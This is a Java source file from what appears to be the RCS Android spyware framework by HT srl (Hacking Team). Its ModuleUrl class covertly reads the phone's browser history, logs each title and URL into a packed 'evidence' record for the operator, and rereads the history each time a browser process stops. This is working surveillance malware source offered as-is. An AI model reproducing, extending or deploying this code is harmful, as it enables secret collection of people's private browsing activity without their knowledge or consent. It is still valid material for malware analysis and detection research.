/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;
import android.provider.Browser;
import android.text.ClipboardManager;
import android.view.ViewDebug;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.interfaces.IncrementalLog;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.module.BaseModule;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.dvci.util.WChar;

import java.util.ArrayList;


public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {

	private static final String TAG = "ModuleUrl"; //$NON-NLS-1$

	int VERSION_DELIMITER = 0x20100713;

	@Override
	public void actualStart() {
		saveUrls();
		ListenerProcess.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerProcess.self().detach(this);
	}

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(20000);
		return true;
	}

	@Override
	public void actualGo() {

	}
	
	private void getClipboard() {

	}

	void saveUrls(){
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveUrls), ");
		}
		String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
		Cursor mCur = Status.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
		mCur.moveToFirst();
		@SuppressWarnings("unused")
		String title = "";
		@SuppressWarnings("unused")
		String url = "";
		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
				url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
				// Do something with title and url
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveUrls), " + title + " url: " + url);
				};

				saveEvidence(title, url);
				mCur.moveToNext();
			}
		}
	}

	private void saveEvidence(String title, String url) {

		//BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari', 'Browser', 'Web']
		int BROWSER_TYPE = 8;

		final byte[] b_tm = (new DateTime()).getStructTm();
		final byte[] b_url = WChar.getBytes(url.toString(), true);
		final byte[] b_title = WChar.getBytes(title, true); //$NON-NLS-1$
		//final byte[] b_window = WChar.getBytes("", true); //$NON-NLS-1$
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		
		EvidenceBuilder evidence;
		
		synchronized (this) {
			evidence = new EvidenceBuilder(EvidenceType.URL);
		}
		
		items.add(b_tm);
		items.add(ByteArray.intToByteArray(VERSION_DELIMITER));
		items.add(b_url);
		items.add(ByteArray.intToByteArray(BROWSER_TYPE));
		items.add(b_title);
		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
		}
		
		synchronized (this) {
			evidence.write(items);
			evidence.close();
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}

		// Do nothing, this log is not incremental anymore
	}

	@Override
	public int notification(ProcessInfo info) {
		if(info.status == ProcessStatus.STOP && info.processInfo.contains("browser")){
			saveUrls();
		}
		return 0;
	}
}
